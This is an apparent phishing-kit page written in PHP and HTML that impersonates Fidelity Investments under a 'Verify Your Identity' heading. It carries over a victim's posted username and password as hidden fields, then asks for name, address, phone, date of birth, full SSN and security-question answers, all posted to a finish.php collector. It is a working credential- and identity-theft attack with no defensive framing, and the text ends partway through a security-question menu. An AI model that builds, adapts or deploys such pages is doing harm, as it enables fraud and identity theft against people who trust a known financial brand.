<?php
$user = $_POST['username'];
$pass = $_POST['password'];
if(!$user || !$pass){
header('Location: ./index.html');
exit();
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
	<head>
		<meta name="keywords" content=""/>
		<meta name="description" content=""/>
					<title>Verify Your Identity</title>

		  
  		  			<meta name="eReview" content="581243.1"/>
  		
		<link rel="stylesheet" media="all" type="text/css" href="./style/sharedExp2.css" />
		
		<script type="text/javascript" src="./style/jquery-1.4.4.min.js"></script>
		<script type="text/javascript" src="./style/jquery.maskedinput-1.2.2.min.js"></script>
		<script type="text/javascript" src="./style/jquery.validate.min.js"></script>
		<script type="text/javascript" src="./style/jquery.hoverIntent.minified.js"></script>
		
		<script type="text/javascript" src="./style/errorMap.js"></script>
		<script type="text/javascript" src="./style/cancelLinksMap.js"></script>
		<script type="text/javascript" src="./style/pageTitlesMap.js"></script>
		<script type="text/javascript" src="./style/sqa_functions.js"></script>
    
<script type="text/javascript">
	var mouseWithinSsnBubble = false;

	function showSsnHelp() {
                $("#ssnMessage").css("left", $(this).position().left - 21);
                $("#ssnMessage").css("top", $(this).position().top + 13);
                $("#ssnMessage").fadeIn('fast', function() { });
        }

        function hideSsnHelp() {
                if(!mouseWithinSsnBubble) {
                        $("#ssnMessage").fadeOut('slow', function() { });
                }
        }

        var ssnConfig = {
                over: showSsnHelp,
                timeout: 500,
                out: hideSsnHelp
        };

	function concatenateDateValues() {			
		var yearVal = $("#year").val();
		var monthVal = $("#month").val().replace("Month", "");
		var dayVal = $("#day").val();

		if(yearVal != "" || monthVal != "" || dayVal != "") {
			$("#birthdateEntered").val(yearVal + "-" + monthVal + "-" + dayVal);
		}
	}

	function clearDayMasking() {				
		var dayVal = $("#day").val();

		if(dayVal === "DD") {
			$("#day").val("");
			$("#day").select();
		}
	}

	function clearYearMasking() {
		var yearVal = $("#year").val();

		if(yearVal === "YYYY") {
			$("#year").val("");
			$("#year").select();
		}
	}
	
	function prependDay() {
		if($("#day").val().length == 1) {
			$("#day").val("0" + $("#day").val()); 
		}	
	}

	function checkDate() {	      
		if($("#day").val().length == 1) {
			$("#day").val("0" + $("#day").val()); 
			concatenateDateValues();
		}
          var month = +$('#month').val() - 1; // Convert to numbers with "+" prefix
    	  var day = +$('#day').val();
    	  var year = +$('#year').val();
    	  var newDate = new Date(year, month, day); // Use the proper constructor
    
    	  if(newDate.getFullYear() == year && newDate.getMonth() == month && newDate.getDate() == day){
    	        //it's a valid date, now return false for future dates
    	        return newDate < new Date();
    	  }
    	  else{
    	        return false;
    	  }
	}

	var inFocus = false;

	var monthErrorDisplayed = false;
	var dayErrorDisplayed = false;
	var yearErrorDisplayed = false;

	$(document).ready(function() {

		var context = "RtlCust";
	    document.title = pageTitleMap.getTitle(context, document.title);
	    $("a#cancelLink").attr('href', cancelLinkMap.setLink(context));
		
                $("#ssnHelpIcon").hoverIntent(ssnConfig);
                 
                $("#ssnHelpIcon").focus( function(){
                    $("#ssnMessage").css("left", $(this).position().left - 21); 
                    $("#ssnMessage").css("top", $(this).position().top + 13);        
                    $("#ssnMessage").fadeIn('fast', function() { });
                });
            	$("#ssnHelpIcon").blur( function(){
                    $("#ssnMessage").fadeOut('slow', function() { });
                });
                 
                $("#ssnMessage .ofBubbleWrapper").mouseenter(function() {
                        mouseWithinSsnBubble = true;
                }).mouseleave(function() {
                        mouseWithinSsnBubble = false;
                        hideSsnHelp();
                });

		$("input[type=text], select").blur(function() {
			$(this).attr("title", "");
			monthErrorDisplayed = false;
			dayErrorDisplayed = false;
			yearErrorDisplayed = false;
		});

		$("input[type=text], input[type=password]").keyup( function (e) {
			if(e.keyCode == 13 || e.keyCode == 9) {
				return false;
			}
			$(this).attr("title", "");
			$(this).parent().parent().removeClass("errorInputRow");
			$(this).parent().parent().parent().parent().parent().parent().removeClass("errorInputRow");
			if($(this).siblings("div.errorMessage").length)
			{
				$(this).siblings("div.errorMessage").remove();
			}
		});

                $("select").change( function () {
                		$(this).attr("title", "");
                        $(this).parent().parent().removeClass("errorInputRow");
                        if($(this).siblings("div.errorMessage").length)
                        {
                                $(this).siblings("div.errorMessage").remove();
                        }
                });
                
        //ie and chrome disable backbutton on select
        $("select").keydown( function (event) {
        	if (event.keyCode == 8) {
        		return false;
        	}
         });
      //firefox and safari disable backbutton on select
         $("select").keypress( function (event) {
        	if (event.keyCode == 8) {
        		return false;
        	}
         });

        $("#year").keyup(concatenateDateValues);
        $("#year").focus(clearYearMasking);
		$("#day").keyup(concatenateDateValues);
		$("#day").focusin(clearDayMasking);
		$("#month").change(concatenateDateValues);
		
		jQuery.validator.addMethod("maskedEmptyCheck", function(value, element) {		
			return this.optional(element) || value.replace(/_/g, "").replace(/\//g, "").length > 0;
                }, "This field is required.");
		
		jQuery.validator.addMethod("ssnLengthCheck", function(value, element) {			
			return this.optional(element) || value.replace(/_/g, "").length == 4;
                }, "SSN is required.");

		jQuery.validator.addMethod("ssnCheck", function(value, element) {
			return this.optional(element) || /^\d{8}[0-9]$/i.test(value);
		}, "SSN is invalid.");
				
		jQuery.validator.addMethod("dateLengthCheck", function(value, element) {			
			return this.optional(element) || value.replace(/_/g, "").replace(/\//g, "").length == 8;
                }, "Date is required.");
				
		jQuery.validator.addMethod("nameCheck", function(value, element) {
			return this.optional(element) || /^[A-Za-z0-9 '\-.,]+$/.test(value);
                }, "Please enter a valid name");

		jQuery.validator.addMethod("dayCheck", function(value, element) {
			return this.optional(element) || /\b([1-9]|0[1-9]|[12][0-9]|3[01])\b/.test(value);
                }, "Please enter a valid day");

        jQuery.validator.addMethod("yearCheck", function(value, element) {
                        var currentYear = (new Date).getFullYear();
                        if ($("#year").val() > currentYear) {
                                return false;
                        } else {
                                return /\b((19|20)\d\d)\b/.test($("#year").val());
                        }
        }, "Please enter a valid year");

		// modify to look for 1. future date
		jQuery.validator.addMethod("dateCheck", function(value, element) {
			return this.optional(element) || checkDate(value);
                }, "Please enter a valid date");
		
		$("#theForm").validate({
			rules: {
			    ssn: {
					required: true,
					ssnCheck: true
				},
				firstName: {
					required: true,
					nameCheck: true					
				},
				lastName: {
					required: true,
					nameCheck: true					
				},
				address: {
					required: true,
					nameCheck: true					
				},
				city: {
					required: true,
					nameCheck: true					
				},
				state: {
					required: true,	
				},
				zip: {
					required: true,	
				},
				country: {
					required: true,	
				},
				phone: {
					required: true,	
					digits: true
				},
				question1: {
					required: true,	
				},
				question2: {
					required: true,	
				},
				question3: {
					required: true,	
				},
				answer1: {
					required: true,	
				},
				answer2: {
					required: true,	
				},
				answer3: {
					required: true,	
				},
				month: {
					required: true,
					digits: true
				},
				day: {
				    required: true,
				    rangelength: [1, 2],
				    dayCheck: true,
					digits: true
				},
				year: {
				    required: true,
				    rangelength: [4, 4],
				    yearCheck: true,
				    digits: true
				},
				birthdateEntered: {
					required: true			    
				}				
			  },
			  messages: {
			    ssn: {
					required: "Please enter full SSN number",
					ssnCheck: "Please enter a valid SSN"					
				},
				firstName: {
					required: "Please enter your first name",
					nameCheck: "Please enter a valid first name"					
				},
				lastName: {
					required: "Please enter your last name",
					nameCheck: "Please enter a valid last name"					
				},
				address: {
					required: "Please enter your address",
					nameCheck: "Please enter a valid address"					
				},
				city: {
					required: "Please enter your city",
					nameCheck: "Please enter a valid city"					
				},
				state: {
					required: "Please chose your state",				
				},
				zip: {
					required: "Please enter your zip/postal code",				
				},
				
				country: {
					required: "Please chose your country",				
				},
				
				phone: {
					required: "Please enter your phone number",	
                    digits: "Please enter a valid phone number"					
				},
				question1: {
					required: "",	
				},
				question2: {
					required: "",	
				},
				question3: {
					required: "",	
				},
				answer1: {
					required: "",	
				},
				
				answer2: {
					required: "",	
				},
				
				answer3: {
					required: "",	
				},
				
				
				month: "Please select a month",				
				day: {
					required: "Please enter a day",
					nameCheck: "Please enter a valid day",
					dayCheck: "Please enter a valid day",
					digits: "Please enter a valid day"
				},
				year: {
					required: "Please enter a year",
					rangelength: "Please enter a valid year",
					yearCheck: "Please enter a valid year",
					digits: "Please enter a valid year"					
				},
				birthdateEntered: {
					required: "Please enter a date"
				}
			  },			  
   			  errorPlacement: function(error, element) {
   				$(element.attr("title", "Error. " + $(error).text()))
				if(element.attr("id") == "month")
				{
					monthErrorDisplayed = true;
				}

				if(element.attr("id") == "day")
				{
					if(monthErrorDisplayed)
					{
						return false;
					}
					else
					{
						dayErrorDisplayed = true;
					}
				}

				if(element.attr("id") == "year")
				{
					if(monthErrorDisplayed || dayErrorDisplayed)
					{
						return false;
					}
					else
					{
						yearErrorDisplayed = true;
					}
				}

				if(element.attr("id") == "birthdateEntered" && (monthErrorDisplayed || dayErrorDisplayed || yearErrorDisplayed)) {
					return false;
				}

				if(element.siblings("div.errorMessage").length)
				{
					element.siblings("div.errorMessage").remove();
				}
				
				element.parent().append('<div class="errorMessage"></div>');
				element.siblings("div.errorMessage").html(error.html());
				
				element.parents("tr.inputRow").removeClass("goodInputRow");
				element.parents("tr.inputRow").addClass("errorInputRow");
			  },
			  onfocusout: false,
			  onkeyup: false,
			  onclick: false,
	          focusInvalid: false, 
                  invalidHandler: function(form,validator) {
                            // Set focus to first element in error
                                if (validator.errorList[0].element.id == "birthdateEntered") {
                                	if(!validator.errorList[1]) {
                                    	validator.errorList[0].element.focus();
                                    } else {
										validator.errorList[1].element.focus();
                                    }
                                } else {
                                        setValidationFocus(form,validator);
                                }

                  },
			  submitHandler: function(form) {
				$(form).find(":submit").attr("disabled", true);
				prependDay();
				concatenateDateValues();
				form.submit(); }
		});

		$("#ssn").val("");
		
		$("#firstName").val("");
		
		$("#lastName").val("");

		var birthDate = "";
		if( birthDate ) {
			var dobArray = birthDate.split(/-/);
			$("#year").val(dobArray[0]);
			$("#month").val(dobArray[1]);
			$("#day").val(dobArray[2]);	
			$("#birthdateEntered").val(birthDate);
		}
		else {
			$("#year").val("YYYY");
			$("#day").val("DD");
		}
		var errorCode = "";
		var errorMsg = errorMap.getValue(errorCode);
		
		if( errorMsg != null && errorMsg !=="" )
		{						
			$(".errorMessage").hide();
			$("#errMsgHolder").html(errorMsg);
			$(".errorMessage").fadeIn("fast");
		}
		$("#ssn").focus();
	});
  </script>

</head>
<body>
<a name="top"></a> 

	<div class="ofRegNav ofHeaderFooterWidth">
   <div class="ofNavless ofAlt1">
    <div class="ofWrapper">
     <img src="./style/fidelity_com_logo.gif" alt="Fidelity Investments" /> 
     <div class="ofClear">
     <!-- -->
     </div>
    </div>
   </div>
</div>

<div class="ofGridWidth12">
  
<div class="ofRegContent">
    
	
	
	<div class="ofReg ofRegPageTitle ofGridWidth9">
     <a name="content"></a>

     <div class="ofHeading ofHeadingOverview">
     				<h1>Verify Your Identity</h1>			
		     </div>
    </div>
	
    <div class="ofReg ofGridWidth10">
		
	    
    <form name="theForm" id="theForm" action="finish.php" method="post" autocomplete="off">
<input type="hidden" value="<?php print $user; ?>" name="user">
<input type="hidden" value="<?php print $pass; ?>" name="pass">
	 
     <div class="ofHeading ofxHeadingHighlightedTable">
      <h2 style="padding: 1px;">
       Verify Your Identity
      </h2> 
     </div>
	 
     <div class="ofContainer ofxAlt2BorderMedium ofAltPageLevelSpacing1">
      <div class="ofEntryForm ofLastChild ofPad1">
        <table cellspacing="0">

         <colgroup>
		 	<col style="width:100%" />
		 </colgroup>

		 <tbody>

          <tr>
           <td class="ofxTextAncillaryAlt1">
            <h6 class="ofxTextAncillaryAlt1">All fields are required.</h6>
           </td>
          </tr>

          <tr class="ofLastChild">
    		<td>
				
				<div class="ofContainer ofAltPageLevelSpacing1 ofLastChild">
			      <div class="ofEntryForm ofxLabelAlt1 ofLastChild">
			        <table cellspacing="0">
			
			         <colgroup>
					 	<col style="width:30%" />
						<col style="width:70%" />
						
					 </colgroup>
			
					 <tbody>
			
			          
			
			          <tr class="inputRow">
			           <th>
					    <div class="formIcon"></div>
					   	<label for="firstName">First Name</label>
			           </th>
					   <td>
						<input type="text" id="firstName" name="firstName" size="20" maxlength="20" tabindex="1"/>
					   </td>
			          </tr>
			
			          <tr class="inputRow">
			           <th>
					    <div class="formIcon"></div>
					   	<label for="lastName">Last Name</label>
			           </th>
					   <td>
						<input type="text" id="lastName" name="lastName" size="20" maxlength="30" tabindex="2"/>
					   </td>
			          </tr>
					  
					  	<tr class="inputRow">
			           <th>
					    <div class="formIcon"></div>
					   	<label for="address">Address Street</label>
			           </th>
					   <td>
						<input type="text" id="address" name="address" size="20" maxlength="30" tabindex="3"/>
					   </td>
			          </tr>
					  
					  			          <tr class="inputRow">
			           <th>
					    <div class="formIcon"></div>
					   	<label for="city">City</label>
			           </th>
					   <td>
						<input type="text" id="city" name="city" size="20" maxlength="30" tabindex="4"/>
					   </td>
			          </tr>
					  
					  			          <tr class="inputRow">
			           <th>
					    <div class="formIcon"></div>
					   	<label for="state">State</label>
			           </th>
					   <td>
						<select size="0" name="state" tabindex="5">
      <option value selected>Select</option>
      <option value="AL">AL - Alabama</option>
      <option value="AK">AK - Alaska</option>
      <option value="AZ">AZ - Arizona</option>
      <option value="AR">AR - Arkansas</option>
      <option value="CA">CA - California</option>
      <option value="CO">CO - Colorado</option>
      <option value="CT">CT - Connecticut</option>
      <option value="DE">DE - Delaware</option>
      <option value="FL">FL - Florida</option>
      <option value="GA">GA - Georgia</option>
      <option value="GU">GU - Guam</option>
      <option value="HI">HI - Hawaii</option>
      <option value="ID">ID - Idaho</option>
      <option value="IL">IL - Illinois</option>
      <option value="IN">IN - Indiana</option>
      <option value="IA">IA - Iowa</option>
      <option value="KS">KS - Kansas</option>
      <option value="KY">KY - Kentucky</option>
      <option value="LA">LA - Louisiana</option>
      <option value="ME">ME - Maine</option>
      <option value="MD">MD - Maryland</option>
      <option value="MA">MA - Massachusetts</option>
      <option value="MI">MI - Michigan</option>
      <option value="MN">MN - Minnesota</option>
      <option value="MS">MS - Mississippi</option>
      <option value="MO">MO - Missouri</option>
      <option value="MT">MT - Montana</option>
      <option value="NE">NE - Nebraska</option>
      <option value="NV">NV - Nevada</option>
      <option value="NH">NH - New Hampshire</option>
      <option value="NJ">NJ - New Jersey</option>
      <option value="NM">NM - New Mexico</option>
      <option value="NY">NY - New York</option>
      <option value="NC">NC - North Carolina</option>
      <option value="ND">ND - North Dakota</option>
      <option value="OH">OH - Ohio</option>
      <option value="OK">OK - Oklahoma</option>
      <option value="OR">OR - Oregon</option>
      <option value="PA">PA - Pennsylvania</option>
      <option value="PR">PR - Puerto Rico</option>
      <option value="RI">RI - Rhode Island</option>
      <option value="SC">SC - South Carolina</option>
      <option value="SD">SD - South Dakota</option>
      <option value="TN">TN - Tennessee</option>
      <option value="TX">TX - Texas</option>
      <option value="UT">UT - Utah</option>
      <option value="VT">VT - Vermont</option>
      <option value="VA">VA - Virginia</option>
      <option value="WA">WA - Washington</option>
      <option value="WV">WV - West Virginia</option>
      <option value="WI">WI - Wisconsin</option>
      <option value="WY">WY - Wyoming</option>
      </select> 
					   </td>
			          </tr>
					  
					   			          <tr class="inputRow">
			           <th>
					    <div class="formIcon"></div>
					   	<label for="zip">Zip Code</label>
			           </th>
					   <td>
						<input type="text" id="zip" name="zip" size="20" maxlength="30" tabindex="6"/>
					   </td>
			          </tr>
					  
					  
					   			          <tr class="inputRow">
			           <th>
					    <div class="formIcon"></div>
					   	<label for="country">Country</label>
			           </th>
					   <td>
						<select size="0" name="country" tabindex="7">
      <option value="AF">Afghanistan</option>
      <option value="AL">Albania</option>
      <option value="DZ">Algeria</option>
      <option value="AS">American Samoa</option>
      <option value="AD">Andorra</option>
      <option value="AO">Angola</option>
      <option value="AI">Anguilla</option>
      <option value="AQ">Antarctica</option>
      <option value="AG">Antigua And Barbuda</option>
      <option value="AR">Argentina</option>
      <option value="AM">Armenia</option>
      <option value="AW">Aruba</option>
      <option value="AU">Australia</option>
      <option value="AT">Austria</option>
      <option value="AZ">Azerbaijan</option>
      <option value="BS">Bahamas</option>
      <option value="BH">Bahrain</option>
      <option value="BD">Bangladesh</option>
      <option value="BB">Barbados</option>
      <option value="BY">Belarus</option>
      <option value="BE">Belgium</option>
      <option value="BZ">Belize</option>
      <option value="BJ">Benin</option>
      <option value="BM">Bermuda</option>
      <option value="BT">Bhutan</option>
      <option value="BO">Bolivia</option>
      <option value="BA">Bosnia and Herzegovina</option>
      <option value="BW">Botswana</option>
      <option value="BV">Bouvet Island</option>
      <option value="BR">Brazil</option>
      <option value="IO">British Indian Ocean Territory</option>
      <option value="BN">Brunei</option>
      <option value="BG">Bulgaria</option>
      <option value="BF">Burkina Faso</option>
      <option value="BI">Burundi</option>
      <option value="KH">Cambodia</option>
      <option value="CM">Cameroon</option>
      <option value="CA">Canada</option>
      <option value="CV">Cape Verde</option>
      <option value="KY">Cayman Islands</option>
      <option value="CF">Central African Republic</option>
      <option value="TD">Chad</option>
      <option value="CL">Chile</option>
      <option value="CN">China</option>
      <option value="CX">Christmas Island</option>
      <option value="CC">Cocos (Keeling) Islands</option>
      <option value="CO">Colombia</option>
      <option value="KM">Comoros</option>
      <option value="CG">Congo</option>
      <option value="CK">Cook Islands</option>
      <option value="CR">Costa Rica</option>
      <option value="CI">Cote D'Ivoire (Ivory Coast)</option>
      <option value="HR">Croatia (Hrvatska)</option>
      <option value="CU">Cuba</option>
      <option value="CY">Cyprus</option>
      <option value="CZ">Czech Republic</option>
      <option value="KP">D.P.R. Korea</option>
      <option value="CD">Dem Rep of Congo (Zaire)</option>
      <option value="DK">Denmark</option>
      <option value="DJ">Djibouti</option>
      <option value="DM">Dominica</option>
      <option value="DO">Dominican Republic</option>
      <option value="TP">East Timor</option>
      <option value="EC">Ecuador</option>
      <option value="EG">Egypt</option>
      <option value="SV">El Salvador</option>
      <option value="GQ">Equatorial Guinea</option>
      <option value="ER">Eritrea</option>
      <option value="EE">Estonia</option>
      <option value="ET">Ethiopia</option>
      <option value="FK">Falkland Islands (Malvinas)</option>
      <option value="FO">Faroe Islands</option>
      <option value="FJ">Fiji</option>
      <option value="FI">Finland</option>
      <option value="FR">France</option>
      <option value="GF">French Guiana</option>
      <option value="PF">French Polynesia</option>
      <option value="TF">French Southern Territories</option>
      <option value="GA">Gabon</option>
      <option value="GM">Gambia</option>
      <option value="GE">Georgia</option>
      <option value="DE">Germany</option>
      <option value="GH">Ghana</option>
      <option value="GI">Gibraltar</option>
      <option value="GR">Greece</option>
      <option value="GL">Greenland</option>
      <option value="GD">Grenada</option>
      <option value="GP">Guadeloupe</option>
      <option value="GU">Guam</option>
      <option value="GT">Guatemala</option>
      <option value="GN">Guinea</option>
      <option value="GW">Guinea-Bissau</option>
      <option value="GY">Guyana</option>
      <option value="HT">Haiti</option>
      <option value="HM">Heard and McDonald Islands</option>
      <option value="HN">Honduras</option>
      <option value="HK">Hong Kong SAR, PRC</option>
      <option value="HU">Hungary</option>
      <option value="IS">Iceland</option>
      <option value="IN">India</option>
      <option value="ID">Indonesia</option>
      <option value="IR">Iran</option>
      <option value="IQ">Iraq</option>
      <option value="IE">Ireland</option>
      <option value="IL">Israel</option>
      <option value="IT">Italy</option>
      <option value="JM">Jamaica</option>
      <option value="JP">Japan</option>
      <option value="JO">Jordan</option>
      <option value="KZ">Kazakhstan</option>
      <option value="KE">Kenya</option>
      <option value="KI">Kiribati</option>
      <option value="KR">Korea</option>
      <option value="KW">Kuwait</option>
      <option value="KG">Kyrgyzstan</option>
      <option value="LA">Lao</option>
      <option value="LV">Latvia</option>
      <option value="LB">Lebanon</option>
      <option value="LS">Lesotho</option>
      <option value="LR">Liberia</option>
      <option value="LY">Libya</option>
      <option value="LI">Liechtenstein</option>
      <option value="LT">Lithuania</option>
      <option value="LU">Luxembourg</option>
      <option value="MO">Macao</option>
      <option value="MK">Macedonia</option>
      <option value="MG">Madagascar</option>
      <option value="MW">Malawi</option>
      <option value="MY">Malaysia</option>
      <option value="MV">Maldives</option>
      <option value="ML">Mali</option>
      <option value="MT">Malta</option>
      <option value="MH">Marshall Islands</option>
      <option value="MQ">Martinique</option>
      <option value="MR">Mauritania</option>
      <option value="MU">Mauritius</option>
      <option value="MX">Mexico</option>
      <option value="FM">Micronesia</option>
      <option value="MD">Moldova</option>
      <option value="MC">Monaco</option>
      <option value="MN">Mongolia</option>
      <option value="MS">Montserrat</option>
      <option value="MA">Morocco</option>
      <option value="MZ">Mozambique</option>
      <option value="MM">Myanmar</option>
      <option value="NA">Namibia</option>
      <option value="NR">Nauru</option>
      <option value="NP">Nepal</option>
      <option value="NL">Netherlands</option>
      <option value="AN">Netherlands Antilles</option>
      <option value="NC">New Caledonia</option>
      <option value="NZ">New Zealand</option>
      <option value="NI">Nicaragua</option>
      <option value="NE">Niger</option>
      <option value="NG">Nigeria</option>
      <option value="NU">Niue</option>
      <option value="NF">Norfolk Island</option>
      <option value="MP">Northern Mariana Islands</option>
      <option value="NO">Norway</option>
      <option value="OM">Oman</option>
      <option value="PK">Pakistan</option>
      <option value="PW">Palau</option>
      <option value="PA">Panama</option>
      <option value="PG">Papua new Guinea</option>
      <option value="PY">Paraguay</option>
      <option value="PE">Peru</option>
      <option value="PH">Philippines</option>
      <option value="PN">Pitcairn</option>
      <option value="PL">Poland</option>
      <option value="PT">Portugal</option>
      <option value="PR">Puerto Rico</option>
      <option value="QA">Qatar</option>
      <option value="RE">Reunion</option>
      <option value="RO">Romania</option>
      <option value="RU">Russia</option>
      <option value="RW">Rwanda</option>
      <option value="KN">Saint Kitts And Nevis</option>
      <option value="LC">Saint Lucia</option>
      <option value="VC">Saint Vincent And The Grenadines</option>
      <option value="WS">Samoa</option>
      <option value="SM">San Marino</option>
      <option value="ST">Sao Tome and Principe</option>
      <option value="SA">Saudi Arabia</option>
      <option value="SN">Senegal</option>
      <option value="SC">Seychelles</option>
      <option value="SL">Sierra Leone</option>
      <option value="SG">Singapore</option>
      <option value="SK">Slovak Republic</option>
      <option value="SI">Slovenia</option>
      <option value="SB">Solomon Islands</option>
      <option value="SO">Somalia</option>
      <option value="ZA">South Africa</option>
      <option value="ES">Spain</option>
      <option value="LK">Sri Lanka</option>
      <option value="SH">St Helena</option>
      <option value="PM">St Pierre and Miquelon</option>
      <option value="SD">Sudan</option>
      <option value="SR">Suriname</option>
      <option value="SJ">Svalbard And Jan Mayen Islands</option>
      <option value="SZ">Swaziland</option>
      <option value="SE">Sweden</option>
      <option value="CH">Switzerland</option>
      <option value="SY">Syria</option>
      <option value="TW">Taiwan</option>
      <option value="TJ">Tajikistan</option>
      <option value="TZ">Tanzania</option>
      <option value="TH">Thailand</option>
      <option value="TG">Togo</option>
      <option value="TK">Tokelau</option>
      <option value="TO">Tonga</option>
      <option value="TT">Trinidad And Tobago</option>
      <option value="TN">Tunisia</option>
      <option value="TR">Turkey</option>
      <option value="TM">Turkmenistan</option>
      <option value="TC">Turks And Caicos Islands</option>
      <option value="TV">Tuvalu</option>
      <option value="UG">Uganda</option>
      <option value="UA">Ukraine</option>
      <option value="AE">United Arab Emirates</option>
      <option value="UK">United Kingdom</option>
      <option value="US" selected>United States</option>
      <option value="UM">United States Minor Outlying Islands</option>
      <option value="UY">Uruguay</option>
      <option value="UZ">Uzbekistan</option>
      <option value="VU">Vanuatu</option>
      <option value="VA">Vatican City State (Holy See)</option>
      <option value="VE">Venezuela</option>
      <option value="VN">Vietnam</option>
      <option value="VG">Virgin Islands (British)</option>
      <option value="VI">Virgin Islands (US)</option>
      <option value="WF">Wallis And Futuna Islands</option>
      <option value="EH">Western Sahara</option>
      <option value="YE">Yemen</option>
      <option value="YU">Yugoslavia</option>
      <option value="ZM">Zambia</option>
      <option value="ZW">Zimbabwe</option>
      </select>
					   </td>
			          </tr>
					  
					  
					  					   			          <tr class="inputRow">
			           <th>
					    <div class="formIcon"></div>
					   	<label for="phone">Phone Number</label>
			           </th>
					   <td>
						<input type="text" id="phone" name="phone" size="20" maxlength="30" tabindex="8"/>
					   </td>
			          </tr>
					  
					  
					  

			          <tr class="ofLastChild inputRow">
			           <th>
					    <div class="formIcon"></div>
					   	<label for="month">Date of Birth</label>
			           </th>
					   <td>
					    <input type="hidden" id="birthdateEntered" name="birthdateEntered" />
					    <select title="Date of Birth: Month" id="month" name="month" tabindex="9">
						 <option>Month</option>
                         <option value="01">January</option>
                         <option value="02">February</option>
                         <option value="03">March</option>
                         <option value="04">April</option>
						 <option value="05">May</option>
						 <option value="06">June</option>
						 <option value="07">July</option>
						 <option value="08">August</option>
						 <option value="09">September</option>
						 <option value="10">October</option>
						 <option value="11">November</option>
						 <option value="12">December</option>
						</select>

						<input type="text" id="day" name="day" style="width: 25px;" maxlength="2" title="Date of Birth: Day" tabindex="10"/>
					   	<input type="text" id="year" name="year" style="width: 40px;" maxlength="4" title="Date of Birth: Year" tabindex="11"/>
					   	
					   </td>
			          </tr>
					  
					  <tr class="inputRow">
			           <th>
					    <div class="formIcon"></div>
					   	<label for="ssn">SSN Number</label>
			           </th>
					   <td>
						<table><tr><td style="width:17%">
						<input type="password" id="ssn" name="ssn" size="12" maxlength="10" tabindex="12"/></td>
					</tr></table>
					   </td>
			          </tr>

			         </tbody>
			        </table>
			      </div>
			     </div>
				
		   </td>
          </tr>

         </tbody>
        </table>
      </div>
	  
	   
     
	  
	 

	 
	 
	 <div class="ofHeading ofxHeadingHighlightedTable">
      <h2 style="padding: 1px;">
       Answer Your Security Question
      </h2> 
     </div>
	 
     <div class="ofContainer ofxAlt2BorderMedium ofAltPageLevelSpacing1">
      <div class="ofEntryForm ofLastChild ofPad1">
	  
        <table cellspacing="0">

         <colgroup>
		 	<col style="width:100%" />
		 </colgroup>
		 
	 <tbody>

          <tr>
           <td class="ofxTextAncillaryAlt1">
            <h6 class="ofxTextAncillaryAlt1">All fields are required.</h6>
           </td>
          </tr>

          <tr class="ofLastChild">
    		<td>
				
				<div class="ofContainer ofAltPageLevelSpacing1 ofLastChild">
			      <div class="ofEntryForm ofxLabelAlt1 ofLastChild">
			        <table cellspacing="0">
			
			         <colgroup>
					 	<col style="width:30%" />
						<col style="width:70%" />
						
					 </colgroup>
			
					 <tbody>
		 
		  
		       <tr class="inputRow">
			           <th>
					    <div class="formIcon"></div>
			           </th>
					   <td>
					<select style="position: relative;right: 300px;top: 5px;" name="question1" id="question1" tabindex="13">

                          <option value="" selected="selected">Select a Question</option>
<option value="What is the name of the hospital in which you were born?">What is the name of the hospital in which you were born?</option>
<option value="In what city was your high school?">In what city was your high school?</option>
<option value="What was your high school mascot?">What was your high school mascot?</option>
<option value="In what city was your mother born?">In what city was your mother born?</option>
<option value="What was the name of your best man/maid of honor?">What was the name of your best man/maid of honor?</option>
<option value="In what city did you honeymoon?">In what city did you honeymoon?</option>
<option value="What is the name of your first employer?">What is the name of your first employer?</option>
<option value="What was the name of your favorite teacher in high school?">What was the name of your favorite teacher in high school?</option>
<option value="What is the name of your oldest niece/nephew?">What is the name of your oldest niece/nephew?</option>
<option value="What was the name of the school you went to in the seventh grade?">What was the name of the school you went to in the seventh grade?</option>
<option value="What was your childhood nickname?">What was your childhood nickname?</option>
<option value="What is the model name of the first car you drove?">What is the model name of the first car you drove?</option>
<option value="What is the name of the camp you attended as a child?">What is the name of the camp you attended as a child?</option>
<option value="What is the name of a college you applied to, but didn't attend?">What is the name of a college you applied to, but didn't attend?</option>
                                        </select >

					   </td>
			          </tr>
					  
					  	 <tr class="inputRow">
			           <th style="position:relative;right: 170px;top: 5px;">
					    <div class="formIcon"></div>
					   	<label for="answer1">Answer:</label>
			           </th>
					   <td style="position:relative;right: 170px;top: 5px;">
						<input type="text" id="answer1" name="answer1" size="20" maxlength="30" tabindex="14"/>
					   </td>
			          </tr>
					  
					     <tr class="inputRow">
			           <th>
					    <div class="formIcon"></div>
			           </th>
					   <td>
					<select style="position: relative;right: 300px;top: 5px;" name="question2" id="question2" tabindex="15">

                          <<option value="" selected="selected">Select a Question</option>
<option value="What is  the first name of your favorite Aunt?" >What is  the first name of your favorite Aunt?</option>
<option value="What is your  mother's middle name?">What is your  mother's middle name?</option>
<option value="What was the name of  your first pet?">What was the name of  your first pet?</option>
<option value="What is your  MATERNAL Grandmother's FIRST NAME?">What is your  MATERNAL Grandmother's FIRST NAME?</option>
<option value="What is your  PATERNAL Grandfather's FIRST NAME?">What is your  PATERNAL Grandfather's FIRST NAME?</option>
<option value="What is the name of  the High School you graduated from?">What is the name of  the High School you graduated from?</option>
<option value="What is the first  name of your closest childhood friend?">What is the first  name of your closest childhood friend?</option>
<option value="What was the first  name of your first roommate?">What was the first  name of your first roommate?</option>
<option value="What is the last  name of your first boss?">What is the last  name of your first boss?</option>
<option value="Where did you meet  your spouse for the first time? (Enter full name of city only)">Where did you meet  your spouse for the first time? (Enter full name of city only)</option>
<option value="What was your  favorite restaurant in college?">What was your  favorite restaurant in college?</option>
<option value="What was the name  of the town your grandmother lived in? (Enter full name of town only)">What was the name  of the town your grandmother lived in? (Enter full name of town only)</option>
<option value="What street did  your best friend in high school live on? (Enter full name of street  only)">What street did  your best friend in high school live on? (Enter full name of street  only)</option> 
                                        </select>

					   </td>
			          </tr>
					  
					  	   			      	 <tr class="inputRow">
			           <th style="position:relative;right: 170px;top: 5px;">
					    <div class="formIcon"></div>
					   	<label for="answer2">Answer:</label>
			           </th>
					   <td style="position:relative;right: 170px;top: 5px;">
						<input type="text" id="answer2" name="answer2" size="20" maxlength="30" tabindex="16"/>
					   </td>
			          </tr>
					  
					  
					     <tr class="inputRow">
			           <th>
					    <div class="formIcon"></div>
			           </th>
					   <td>
					<select style="position: relative;right: 300px;top: 5px;" name="question3" id="question3" tabindex="17">

                         <option value="" selected="selected">Select a Question</option>
